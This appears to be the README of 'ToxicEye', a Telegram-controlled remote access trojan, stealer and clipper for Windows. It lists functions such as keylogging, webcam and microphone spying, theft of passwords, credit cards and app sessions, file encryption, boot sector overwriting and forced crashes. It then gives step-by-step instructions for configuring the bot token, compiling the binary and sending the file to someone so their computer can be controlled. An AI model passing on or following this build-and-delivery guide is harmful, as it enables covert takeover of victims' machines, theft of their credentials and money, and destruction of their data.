# :trident: ToxicEye (RAT + STEALER + CLIPPER)
Program for remote control of windows computers via telegram bot. Written in C#  

<p align="center">
  <img src="images/logo.png">
</p>

# :fallen_leaf: Functions:
ComputerInfo, BatteryInfo, Location, Whois, ActiveWindow, Webcam, Microphone, Desktop, Keylogger, ClipboardSet, ClipboardGet, ProcessList, ProcessKill, ProcessStart, TaskManagerDisable, TaskManagerEnable, MinimizeAllWindows, MaximizeAllWindows, GetPasswords, GetCreditCards, GetHistory, GetBookmarks, GetCookies, GetDesktop, GetFileZilla, GetDiscord, GetTelegram, GetSteam, OpenCD, CloseCD, DownloadFile, UploadFile, RunFile, RunFileAdmin, ListFiles, RemoveFile, RemoveDir, MoveFile, MoveDir, CopyFile, CopyDir, Speak, Shell, MessageBox, OpenURL, SendKeyPress, NetDiscover, AudioVolumeSet, AudioVolumeGet, SetWallPaper, BlockInput, Monitor(off/on), DisplayRotate, EncryptFileSystem, DecryptFileSystem,ForkBomb, BsoD, OverwriteBootSector, Shutdown, Reboot, Hibernate, Logoff, Help, About, Uninstall.

# :hammer: Compiling guide:  
* Go to the [@BotFather](https://t.me/BotFather) bot and create your own bot. You need to save the token and bot name.  
  ![](images/createBot.JPG)  
* Now you need to get your chat id. To do this, go to the next bot [@chatid_echo_bot](https://t.me/chatid_echo_bot) and save the id.  
  ![](images/chatidBot.JPG)  
* Now you need to download [Visual Studio 2019](https://visualstudio.microsoft.com/en/vs/)  
  ![](images/vs.JPG)  
* Download the [source code](https://codeload.github.com/LimerBoy/ToxicEye/zip/master) of this program.  
  ![](images/loadSourceCode.JPG)  
* Unzip the “Telegram RAT” folder to your desktop.  
* Open the TelegramRAT.sln file through Visual Studio.  
* Open file config.cs in project.  
  ![](images/openConfig.JPG)  
* Insert your token from the bot and your chatID that you received earlier.  
* Above you need to select ”Release”.  
  ![](images/saveConfig.JPG)  
* Press CTRL + S to save. And CTRL + B to compile everything into an executable file.  
  ![](images/build.JPG)   
* You can send the received file to someone.  
* After starting the file, you can control the computer through the bot.  
  ![](images/openMalware.JPG)  
* Write `/help` to see all available commands.  
